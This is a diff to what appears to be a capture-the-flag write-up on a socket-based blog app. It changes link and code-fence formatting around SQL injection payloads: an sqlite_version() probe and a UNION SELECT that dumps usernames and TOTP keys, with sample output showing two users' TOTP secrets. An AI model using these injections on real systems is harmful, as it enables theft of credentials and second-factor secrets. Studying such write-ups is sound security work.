@@ -27,7 +27,7 @@ title: "A review of American sockets"
 
 This is the post structure. Mind the hidden field because if its true we can't see it.
 
-[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#dbms-identification) using these payloads we can identify database system and develop payload for it.
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification using these payloads we can identify database system and develop payload for it.
 
 ```javascript
 r.send(o.encode(["getPost", "1 and sqlite_version()=sqlite_version()"]))
@@ -63,7 +63,7 @@ After find out column names we can get user names and totp keys.
 r.send(o.encode(["getPost", "999 or 1=1 UNION SELECT username,totp_key,0,0,0,0 from users "]));
 ```
 
-```json
+```javascript
 {id: "alice", title: "J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ", author: 0, text: 0, postDate: 0, …}
 {id: "bob", title: "IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA", author: 0, text: 0, postDate: 0, …}
 ```
